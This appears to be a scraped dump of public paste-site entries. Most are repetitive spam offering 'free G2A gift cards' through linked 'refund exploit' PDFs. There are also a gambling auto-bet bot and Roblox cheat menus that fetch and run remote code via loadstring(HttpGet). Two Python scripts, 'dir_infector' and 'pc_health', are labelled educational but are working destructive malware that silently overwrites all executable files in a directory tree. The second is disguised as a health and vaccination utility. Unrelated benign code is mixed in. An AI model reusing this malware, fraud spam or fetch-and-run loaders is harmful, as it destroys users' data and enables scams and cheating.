    ""OwfGgo"": 1,
    ""mXflxwnrd"": 1,
    ""ZEKAhJ"": 1,
    ""AqXnbJ"": 1
  },
  ""keyboard"": {
    ""Unknown"": 9722
  },
  ""client_build"": {
    ""Unknown"": 9722
  },
  ""client_name"": {
    ""Unknown"": 9722
  },
  ""ip_type"": {
    ""proxy"": 7,
    ""Unknown"": 6477,
    ""hosting & proxy"": 236,
    ""hosting"": 2797,
    ""mobile"": 205
  }
}"
fDuxH6BM,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Saturday 25th of May 2024 07:14:43 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_936124.pdf

Working as of:
26 May 2024"
RLxPRpWi,💸G2A.com Free Gift Card Guide May 2024,Garoam,GetText,Saturday 25th of May 2024 07:04:05 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_6717269.pdf

Working as of:

26 May 2024"
24qHErYd,snowybot 1.9times,coinwalk,JavaScript,Saturday 25th of May 2024 06:57:02 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/100).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var winnerdinner = (elderly*1.9);
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var fart = 1;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great<=(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great>=(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(snowy-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (((great/24)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*fart)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 1;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
R82yRAJN,💰G2A.com Free Gift Card Guide May 2024,lookos13,GetText,Saturday 25th of May 2024 06:52:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_6717269.pdf

Working as of:

26 May 2024"
tmu9nb8u,🎉G2A.com Free Gift Card Guide May 2024🔥,pestinha,GetText,Saturday 25th of May 2024 06:46:10 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most updated version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_6717269.pdf

Working as of:

26 May 2024"
90jbSDJM,Untitled,Bangyan,JavaScript,Saturday 25th of May 2024 06:42:06 PM CDT,"[
  {
    ""username"": ""nama"",
    ""Ip"": ""152.42.234.95"",
    ""Access"": true,
    ""Added on"": ""8/5/2024""
  }
]"
cfNe8Qsu,snowybot 1.9times,coinwalk,JavaScript,Saturday 25th of May 2024 06:22:05 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((elderly/240).toFixed(8));
var beast = prefit;
var tens = (prefit*10);
var sevens = (prefit*6.9);
var eights = (prefit*7.9);
var fives = (prefit*4.9);
var winnerdinner = (elderly*1.9);
var snowy = ((Math.floor(elderly/tens))*tens);
var snowzy = ((Math.floor(elderly/tens))*tens);
var snowie = ((Math.floor(elderly/tens))*tens);
var great = elderly;
var bolux = false;
var upped = 6.9;
var downed = 2.9;
var fart = 1;
 
function go(){
great = document.getElementById('pct_balance').value;
var dog = Number((great-elderly).toFixed(8));
console.log(""profit"");
console.log(dog);
if (great<=(snowie-(beast*downed))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if (great>=(snowie+(beast*upped))){
    beast = beast*2;
    upped = 4.9;
    downed = 4.9;
    snowie = parseFloat(great);
}
if ((great<=(snowy-tens))&&(great<(((Math.floor(great/tens))*tens)+fives))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if (((great/40)<=beast)&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 0;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
}
if ((great>=(snowzy+(tens*fart)))&&(great<(((Math.floor(great/tens))*tens)+sevens))){
    beast = prefit;
    upped = 6.9;
    downed = 2.9;
    fart = 1;
    snowie = ((Math.floor(great/tens))*tens);
    snowy = ((Math.floor(great/tens))*tens);
    snowzy = ((Math.floor(great/tens))*tens);
}
if (great>=winnerdinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();"
85cpkPGj,VBA Portofolio,GarlandA,VBScript,Saturday 25th of May 2024 06:17:11 PM CDT,"Public Function Portofolio(Data As Variant, StartDate As Date, EndDate As Date, priceType As StockPriceType) As Variant

  ' Initialisation
    Dim Variances As Collection   ' Vecteur des Variances pondéré au carré
    Dim Rendements As Collection  ' Vecteur des rendements pondéré
    Dim Covariances As Collection ' Matrice Covariances Pondéré par leur poids
 
    Dim Portofolio As Collection  ' Structure de donnée en sortie, au lieu d'un collection, peut être un objet = dict
    
    Dim i As Integer
    Dim j As Integer
    
  ' Calcul des rendements et variances de chaque action du portefeuille
    Dim Stock As Collection
    
    For i = 1 To Data(""Stocks"").Item.Count
        Set Stock = GetStockData(Data(""Stocks"").Item(i), StartDate, EndDate)
        Rendements.Add CalcMean(Stock, priceType) * Data(""Weight"").Item(i)            ' Le rendement pondéré par son poids
        Variances.Add CalcVolatilite(Stock, priceType) * (Data(""Weight"").Item(i) ^ 2) ' La variance pondéré par son poids
    Next
    
  ' Calcul des differentes paires de Covariances
    Dim Stock_i As Collection
    Dim Stock_j As Collection
    Dim Covariance As Collection
    
    For i = 1 To Data(""Stocks"").Item.Count - 1                                         ' On itère de 1 à N-1
        Set Stock_i = GetStockData(Data(""Stocks"").Item(i), StartDate, EndDate)
        For j = 2 To Data(""Stocks"").Item.Count                                         ' On itère de 2 à N
            Set Stock_j = GetStockData(Data(""Stocks"").Item(i), StartDate, EndDate)
            Covariance.Add CalcCovariance(Stock_i, Stock_j, priceType) * Data(""Weight"").Item(i) * Data(""Weight"").Item(j)
        Next j
        Covariances.Add Covariance
        Set Covariance = New Collection                                                ' Reinitialisation Covariance
    Next i
    
  ' Rendement et Variance du portefeuille
    Dim Rendement As Collection
    Dim Variance As Collection
    
    Dim R As Double
    Dim V As Double
    Dim CV As Double
    Dim CVs As Double
    
    ' Somme des Rendements pondéres des actions du portefeuille
    For i = 1 To Rendements.Item.Count
     R = R + Rendements.Item(i)
     V = V + Variances.Item(i)
    Next i
    
    ' Calcul de la Variance du portefeuille
    For i = 1 To Data(""Stocks"").Item.Count - 1
        For j = 1 To Covariances(i).Item.Count
            CVs = CVs + Covariances(i).Item(j)
        Next j
        CV = CV + CVs
        CVs = 0
    Next i
    
    Rendement.Add R
    Variance.Add V + 2 * CV
    
    Portofolio.Add Rendement
    Portofolio.Add Variance
    

End Function

Sub ShowPortofolio()
 Dim Data As Dictionary 'J'aimerais que data soit un dictionnaire
 Dim Portofolio As Dictionary 'Le dictionaire qui contient le rendement et variance de notre portefeuille
 Dim StartDate As Date
 Dim EndDate As Date
 Dim P As Variant
 
 Set Data(""Stocks"") = GetDictonnary 'GetDictonnary serait une fonction qui renvoie une liste de valeurs, ici on voudrait les symboles de nos actions du portefeuille
 Set Data(""Weight"") = GetDictonnary 'Ici on recupere les ponderations pour les actions de notre portefeuille
 Set StartDate = DateSerial(2007, 1, 1)
 Set EndDate = DateSerial(2007, 12, 31)
 
 P = Portofolio(Data, StartDate, EndDate, StockPriceType.closePrice)
 Set Portofolio(""Rendement"") = P.Item(1)
 Set Portofolio(""Variance"") = P.Item(2)

' Print the average return
    Debug.Print ""Portofolio's return from "" & StartDate & "" To "" & EndDate & "": "" & Portofolio(""Rendement"").Item
    Debug.Print ""Portofolio's variance from "" & StartDate & "" To "" & EndDate & "": "" & Portofolio(""Variance"").Item
    
    Debug.Print ""Average Return for "" & StockSymbol & "": "" & meanReturn
End Sub"
nGJC1adP,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🎁,ssss50w,GetText,Saturday 25th of May 2024 06:01:24 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
26 May 2024"
DVDA2hLx,💸G2A.com Free Gift Card Guide May 2024 FIX🎉,sirmikey,Python,Saturday 25th of May 2024 05:43:50 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Xbox gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_5283418.pdf

Working as of:

25 May 2024"
g6b7zmwJ,mac vendor list (oui.txt),John4711,JavaScript,Saturday 25th of May 2024 05:29:53 PM CDT,"// https://standards-oui.ieee.org/
var a=[];
for (var x of document.body.innerText.matchAll(/^(?<mac>[A-Z0-9]{6}).*\(base 16\)\W+(?<vendor>[\S ]+)$/gim)) {
   a.push(x.groups)
};

a=a.sort((a,b)=>a.mac.localeCompare(b.mac));
document.body.innerHTML=`<pre>${a.map(v=>v.mac+""\t""+v.vendor).join(""\n"")}</pre>`;"
UAT4r5n4,dir_infector,Python253,Python,Saturday 25th of May 2024 05:06:50 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: dir_infector.py
# Version: 1.0.2
# Author: Jeoi Reqi

""""""
Description:

    - The ""FileInfector"" class represents a hypothetical malware utility.
    - It's designed for educational purposes to demonstrate how code injection works in files within a single directory.
    - Files within the specified directory get ""infected"" with a randomly generated malicious payload.

**
WARNING:
    ! THIS SCRIPT WILL OVERWRITE ALL FILES IN THE SPECIFIED DIRECTORY WITH THE MALICIOUS PAYLOAD!
    ! ADDITIONALLY, THE PAYLOAD WILL INJECT INTO THIS SCRIPT, OVERWRITING ITS CONTENTS!
    ! RUNNING THIS SCRIPT WITHOUT PROPER PRECAUTIONS CAN LEAD TO IRREVERSIBLE DATA LOSS, INCLUDING THE SCRIPT ITSELF!
    ! ALWAYS KEEP A BACKUP AND RUN THIS SCRIPT ONLY IN A SAFE ENVIRONMENT WHERE NO IMPORTANT FILES ARE PRESENT!
    ! EXERCISE EXTREME CAUTION!
**

This example malware consists of the following components:

1. FileInfector Class:
    - This class serves as the core of the malware.
    - It includes methods for infecting or ""vaccinating"" files in a single directory.
    - The randomly generated payload is combined with a predefined malicious message.

2. Attributes:
   - `name`: Represents the name of the vaccination utility.

3. Methods:
    - `__init__(self, name)`:
          Initializes a new instance of the FileInfector class with a provided name.
    - `name.setter`:
          Sets the name of the utility.
    - `malicious_code`:
          Generates a random malicious payload.
    - `infect_files_in_directory(directory)`:
          Infects files in the specified directory.

Real Results of the Functions:

    - Upon execution, the malware generates a malicious payload.
    - It traverses through all files in the specified directory.
    - For each file found, the malware attempts to inject the payload.
    - If successful, the file is considered ""infected,"" and the count increments.
    - The malware operates silently, ignoring errors to avoid detection.
    - While the primary purpose is educational, showing code injection and its potential consequences, it can cause irreversible damage to files.
    - Exercise extreme caution when using this script.
""""""

import logging
import os
import random
import string
from textwrap import dedent, wrap
import sys

class FileInfector:
    """""" This class represents the code injecting malware. """"""

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """""" Name of the malware. """"""
        return self._name
    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def malicious_code(self):
        """""" Malicious code generation (hypothetical for educational purposes). """"""
        random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=111020))
        wrapped_string = '\n'.join(wrap(random_string, width=70))
        return dedent(
            f""""""
                    MALWARE INJECTION PASSED!
                    YOUR FILES ARE ALL GONE!

{wrapped_string}
            """"""
        )

    def infect_files_in_directory(self, directory):
        """""" Perform file infection on all files in the given directory. """"""
        num_infected_files = 0
        for file_name in os.listdir(directory):
            file_path = os.path.join(directory, file_name)
            if os.path.isfile(file_path) and os.access(file_path, os.X_OK):
                try:
                    with open(file_path, 'w', encoding='utf-8') as infected_file:
                        infected_file.write(self.malicious_code)
                    num_infected_files += 1
                except (IOError, OSError) as e:
                    logging.error(f""Failed to write to {file_path}: {e}"")
        return num_infected_files

if __name__ == '__main__':
    # Configure logging
    logging.basicConfig(level=logging.INFO)
    
    # Create an instance of the FileInfector class
    code_injector = FileInfector('SimpleFileInfector')
    
    # Get the directory path of the current script
    path = os.path.dirname(os.path.abspath(__file__))
    
    # Infect files in the directory
    number_infected_files = code_injector.infect_files_in_directory(path)
    
    # Log the number of infected files
    logging.info(f'Number of infected files: {number_infected_files}')
    
    # Exit the script after completion
    sys.exit()"
w5j5pjW6,pc_health,Python253,Python,Saturday 25th of May 2024 04:56:21 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: pc_health.py
# Version: 1.0.3
# Author: Jeoi Reqi

""""""
Description:

    - The ""Vaccinated"" class is a hypothetical malware utility.
    - It's designed for educational purposes to demonstrate how code injection works in files.
    - It explores directories and subdirectories, overwriting the content of files within.
    - Files get ""vaccinated"" with a randomly generated malicious payload.

**
WARNING:
    ! THIS SCRIPT WILL OVERWRITE ALL FILES IN THE CURRENT WORKING DIRECTORY (CWD) AND ITS SUBDIRECTORIES WITH THE MALICIOUS PAYLOAD!
    ! ADDITIONALLY, THE PAYLOAD WILL INJECT INTO THIS SCRIPT, OVERWRITING ITS CONTENTS!
    ! RUNNING THIS SCRIPT WITHOUT PROPER PRECAUTIONS CAN LEAD TO IRREVERSIBLE DATA LOSS, INCLUDING THE SCRIPT ITSELF!
    ! ALWAYS KEEP A BACKUP AND RUN THIS SCRIPT ONLY IN A SAFE ENVIRONMENT WHERE NO IMPORTANT FILES ARE PRESENT!
    ! EXERCISE EXTREME CAUTION!
**

This example malware consists of the following components:

1. Vaccinated Class:
    - This class serves as the core of the malware.
    - It includes methods for infecting or ""vaccinating"" files in a directory.
    - The randomly generated payload is combined with a predefined malicious message.

2. Attributes:
   - `name`: Represents the name of the vaccination utility.

3. Methods:
    - `__init__(self, name)`:
          Initializes a new instance of the Vaccinated class with a provided name.
    - `name.setter`:
          Sets the name of the utility.
    - `immunization`:
          Generates a random immunization message with a randomly generated payload.
    - `vaccinate_files_in_directory(directory)`:
          Vaccinates files in the specified directory and subdirectories.

Real Results of the Functions:

    - Upon execution, the malware generates an 'immunization' message with a randomly generated payload.
    - It recursively traverses through all files in the specified directory and its subdirectories.
    - For each file found, the malware attempts to inject the payload.
    - If successful, the file is considered ""vaccinated,"" and the count increments.
    - The malware operates silently, ignoring errors to avoid detection.
    - While the primary purpose is educational, showing code injection and its potential consequences, it can cause irreversible damage to files.
    - Exercise extreme caution when using this script.
""""""

import os
import random
import string
from textwrap import dedent, wrap

class Vaccinated:
    """"""
    A class representing a vaccination utility for files in a directory.

    Attributes:
        name (str): The name of the vaccination utility.
    """"""

    def __init__(self, name):
        """"""
        Initializes a Vaccinated instance.

        Args:
            name (str): The name of the vaccination utility.
        """"""
        self._name = name

    @property
    def name(self):
        """"""
        str: The name of the vaccination utility.
        """"""
        return self._name

    @name.setter
    def name(self, new_name):
        """"""
        Sets the name of the vaccination utility.

        Args:
            new_name (str): The new name of the vaccination utility.
        """"""
        self._name = new_name

    @property
    def immunization(self):
        """"""
        str: Generates a random immunization message.

        Returns:
            A string containing a random immunization message.
        """"""
        antibody_string = """".join(
            random.choices(string.ascii_letters + string.digits, k=111020)
        )
        wrapped_antibody = ""\n"".join(wrap(antibody_string, width=70))
        return dedent(
            f""""""
                        YOU ARE NOW IMMUNE!

{wrapped_antibody}

                ALL YOUR FILES ARE PROTECTED!
            """"""
        )

    def vaccinate_files_in_directory(self, directory):
        """"""
        Vaccinates files in the given directory and its subdirectories.

        Args:
            directory (str): The path to the directory to vaccinate.

        Returns:
            int: The number of files vaccinated.
        """"""
        num_vaccinated_files = 0
        for root, _, files in os.walk(directory):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                if os.access(file_path, os.X_OK):
                    try:
                        with open(file_path, ""w"", encoding=""utf-8"") as vaccinated_file:
                            vaccinated_file.write(self.immunization)
                        num_vaccinated_files += 1
                    except (IOError, OSError) as e:
                        pass  # Ignore errors silently
        return num_vaccinated_files

if __name__ == ""__main__"":
    # Create an instance of the Vaccinated class
    vaccine_inoculator = Vaccinated(""SimpleVaccineInoculator"")
    
    # Get the directory path of the current script
    path = os.path.dirname(os.path.abspath(__file__))
    
    # Vaccinate files in the directory and its subdirectories
    number_vaccinated_files = vaccine_inoculator.vaccinate_files_in_directory(path)
"
U7WBsKWY,💰G2A.com Free Gift Card Guide May 2024 FIX🚀,Garoam,Python,Saturday 25th of May 2024 04:44:12 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Apple gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_5283418.pdf

Working as of:

25 May 2024"
viv5mEAR,🎉G2A.com Free Gift Card Guide May 2024 FIX💰,atakan1983,Python,Saturday 25th of May 2024 04:38:16 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_5283418.pdf

Working as of:

25 May 2024"
BaE8YPfq,Incarcerated,HaloJnZ,Lua,Saturday 25th of May 2024 04:34:00 PM CDT,"local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = ""Incarcerated | W.I.P"",
   LoadingTitle = ""Incarcerated | Loading"",
   LoadingSubtitle = ""Made by maylol1#8468"",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = ""Universal Cheats | Incarcerated""
   },
   Discord = {
      Enabled = true,
      Invite = ""AnDaX252yX"", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = ""Untitled"",
      Subtitle = ""Key System"",
      Note = ""No method of obtaining the key is provided"",
      FileName = ""Key"", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {""Hello""} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings (""hello"",""key22"")
   }
})

local Tab = Window:CreateTab(""Aim Section"", nil) -- Title, Image
local MSection = Tab:CreateSection(""Aim"")

local Button = Tab:CreateButton({
   Name = ""Aimbot | Restart if you wanna stop aimbot"",
   Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/6wCs182z'))()
   end,
})

local Button = Tab:CreateButton({
   Name = ""ESP | Click Q to toggle"",
   Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/XYLZmaFs'))()
   end,
})

local Tab = Window:CreateTab(""Miscellaneous"", nil) -- Title, Image
local MISection = Tab:CreateSection(""Miscellaneous"")

local Button = Tab:CreateButton({
   Name = ""Click V to teleport"",
   Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/gHmJg6Zm'))()
   end,
})

local Button = Tab:CreateButton({
   Name = ""Fly | Click G to Toggle"",
   Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/tZ3wTwyC'))()
   end,
})

local Button = Tab:CreateButton({
   Name = ""Infinite Jump"",
   Callback = function()
            loadstring(game:HttpGet('https://pastebin.com/raw/3SF4d3k4'))()
   end,
})"
vPuaEgE4,💸G2A.com Free Gift Card Guide May 2024 FIX🔥,lookos13,Python,Saturday 25th of May 2024 04:32:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Steam gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_5283418.pdf

Working as of:

25 May 2024"
3Y0qPqK4,💰G2A.com Free Gift Card Guide May 2024 FIX🎉,pestinha,Python,Saturday 25th of May 2024 04:26:10 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered. 
This is the most up to date version of this script. Any other posted will not work!

PDF guide here:
https://drive.google.com/file/d/13fMNGqCtIp_audnfJynQaaYtl3NaICCd/view?usp=g2a_refund_exploit_5283418.pdf

Working as of:

25 May 2024"
Nr0HQDmq,Untitled,ofmarconi,PHP,Saturday 25th of May 2024 04:21:59 PM CDT,"// Função para adicionar o filtro de mídia baseado no nome ou e-mail do autor
function marks_filter_media_by_author_name_or_email($query) {
    global $pagenow;

    // Verifica se estamos na página de upload e se o parâmetro author_name_email está definido
    if (($pagenow == 'upload.php' || $pagenow == 'post.php' || $pagenow == 'post-new.php') && isset($_GET['author_name_email'])) {
        $author_name_email = sanitize_text_field($_GET['author_name_email']);
        
        // Realiza uma consulta para buscar usuários com base no nome ou e-mail
        $user_query = new WP_User_Query(array(
            'search'         => '*'.esc_attr($author_name_email).'*',
            'search_columns' => array('user_nicename', 'user_email'),
        ));

        $authors = $user_query->get_results();
        if (!empty($authors)) {
            $author_ids = wp_list_pluck($authors, 'ID');
            // Define a consulta para buscar mídia com os IDs dos autores encontrados
            $query->set('author__in', $author_ids);
        } else {
            // Se nenhum autor corresponder, não retorna nenhum resultado
            $query->set('author__in', array(0));
        }
    }
}

add_action('pre_get_posts', 'marks_filter_media_by_author_name_or_email');

// Adiciona um campo de filtro personalizado no topo da página de mídia e nos modais de mídia
function marks_add_author_name_email_filter() {
    $screen = get_current_screen();
    if ($screen->id !== 'upload' && strpos($screen->id, 'media-modal') === false) {
        return;
    }

    $author_name_email = isset($_GET['author_name_email']) ? sanitize_text_field($_GET['author_name_email']) : '';
    ?>
    <div style=""margin-top: 10px; padding: 10px; background-color: #f1f1f1;"">
        <form method=""GET"" action="""" id=""author-filter-form"" style=""display: flex; align-items: center;"">
            <?php
            // Preserva os parâmetros existentes na URL
            foreach ($_GET as $key => $value) {
                if ($key !== 'author_name_email') {
                    echo '<input type=""hidden"" name=""' . esc_attr($key) . '"" value=""' . esc_attr($value) . '"" />';
                }
            }
            ?>
            <input type=""text"" name=""author_name_email"" placeholder=""Nome ou E-mail do Autor"" value=""<?php echo esc_attr($author_name_email); ?>"" style=""margin-right: 5px;"" />
            <button type=""submit"">Filtrar por Autor</button>
        </form>
    </div>
    <?php
}

add_action('all_admin_notices', 'marks_add_author_name_email_filter');
add_action('print_media_templates', 'marks_add_author_name_email_filter');



// Adiciona um filtro para modificar as consultas AJAX de anexos na visualização em grade e modais
function marks_ajax_query_attachments_args($query) {
    if (isset($_REQUEST['query']['author_name_email'])) {
        $author_name_email = sanitize_text_field($_REQUEST['query']['author_name_email']);

        $user_query = new WP_User_Query(array(
            'search'         => '*'.esc_attr($author_name_email).'*',
            'search_columns' => array('user_nicename', 'user_email'),
        ));

        $authors = $user_query->get_results();
        if (!empty($authors)) {
            $author_ids = wp_list_pluck($authors, 'ID');
            $query['author__in'] = $author_ids;
        } else {
            $query['author__in'] = [0];
        }
    }
    return $query;
}

add_filter('ajax_query_attachments_args', 'marks_ajax_query_attachments_args');

"
gHmJg6Zm,tp script,HaloJnZ,Lua,Saturday 25th of May 2024 03:46:43 PM CDT,"plr = game.Players.LocalPlayer
 
hum = plr.Character.HumanoidRootPart
 
mouse = plr:GetMouse()
 
 
 
mouse.KeyDown:connect(function(key)
 
if key == ""v"" then
 
if mouse.Target then
 
hum.CFrame = CFrame.new(mouse.Hit.x, mouse.Hit.y + 5, mouse.Hit.z)
 
end
 
end
end)"
LKtf5YWY,BLACK OK very GOOD VK with shuffle,max2201111,Python,Saturday 25th of May 2024 03:41:08 PM CDT,"#Navod na pouziti, Mgr. Hynek Mlčoušek, v Brne 2.5.2024
#Ulozte do lokalniho souboru u sebe na PC data tohoto tvaru vzdy ukoncene 0 ci 1 (jde o uceni s ucitelem: 1 = nemocny, 0 = prezil/zdravy, ve vystupu bude zelena znacit 0, cervena 1)  a bez znaku #; pozor na "",""

# [ [23.657800719276743,18.859916797201468,0],
# [22.573729142097473,17.96922325097786,0],
# [32.55342396968757,29.463651408558803,0],
# [6.718035041529263,25.704665468161718,1],
# [14.401918566243225,16.770856492924658,0],
# [17.457907312962234,21.76521470574044,0],
# [20.02796946568093,73.45445954770891,1],
# [30.295138369778076,62.901112886193246,1],
# [15.128977804449633,32.40267702110393,0],
# [30.179457395820013,58.982492125646104,1],
# [28.01649701854089,63.92781357637711,1],
# [16.791838457871147,42.33482314089884,0],
# [10.583694293380976,19.61926728942497,0],
# [26.634447074406467,91.96624817360987,1],
# [26.217868623367643,36.400293587062976,0],
# [17.689396788624936,60.79797114006423,1],
# [33.17193822527976,66.75277364959176,1],
# [23.793952755709153,22.57501437360518,0]]

#kliknete na cerne tlacitko s trojuhelnickem vlevo nahore
#pod kodem se objevi moznost spustit dialogove okenko, kliknete na nej
#soubor, ktery mate z bodu vyse vyberte a nahrajte
#Najdete v tomto kodu retezec:
###ZDE VLOZTE DATA OD NOVYCH PACIENTU

#Vlozte do pole
# new_persons_results = []
# data o nekolika malo novych pacientech bez ukoncovaci 0 a 1, ale se stejnym poctem sloupcu jako ma soubor z Vaseho lokalniho disku, vyse by tedy toto bylo rovno 2
#kod vyhodi hned po natrenovani, (jehoz prubeh muzete sledovat na modre progres bare) pro kazdy radek z new_persons_results bilo-sedo-cerne ctverecky vznikle z normalizace poskytnutych dat a ukoncovaci ctverecek cerveny pripadne zeleny
#zaroven s tim se vypise realne cislo mezi 0 a 1 znacici jak moc je pacient zdravy (blizke 0) ci nemocny (blizke 1)
#cisla uprostred pak indikuji zadany oranzovy semafor.
#je na lekarich nastavit tresholdy (tedy pravdepodobnosti: cisla mezi 0 a 1) ktere pak daji zaver, zda je pacient cerveny, oranzovy ci zeleny

# prosim o komnetare a vysledky na realnych datech, je zadouci aby radku v matici, tedy pacientu byly stovky a sloupcu desitky
# Moznosti vyuziti: onkologicka diagnoza vs. zdrava kontorlni skupina, diabetes (pritomnost/nepritomnost), testovani noveho leku oproti placebu atd.

#kod zaroven vyhodi confusion matici, tedy mozne True Negative a False Positive plus spravne zarazene hodnoty spolu s presnosti,F1 score recall atd.
#poznamka ke kodu: jde o epxerimentalni verzi, ktera krome skutecne potrebneho kodu obsahuje ladici informace, ruzne duplicity, nadbytecne prikazy atd.
# Na uvod behu programu se pro kontorlu vypise poskytnuta matice a jeji normalizovana verze, je treba sjet jezdcem napravo nize na obrazky a dalsi vystupy

#Dekuji profesoru Petru Dostalovi za namet k teto praci a poskytnuta data, byt je potreba mit data realna

import numpy as np
import matplotlib.pyplot as plt
import tensorflow as tf
from tqdm import tqdm


from IPython.display import display
from IPython.display import Javascript
display(Javascript('IPython.OutputArea.auto_scroll_threshold = 9999;'))

label_colors = {0: [0, 128, 0], 1: [255, 0, 0]}
label_colors_testing = {0: [0, 128, 0], 1: [255, 0, 0]}


%matplotlib inline



# Function to create images based on predictions
def create_image(data, predictions):
    num_rows, num_columns = len(data), len(data[0])
    image = np.zeros((num_rows, num_columns + 1, 3), dtype=np.uint8)

    for i in range(num_rows):
        for j in range(num_columns):
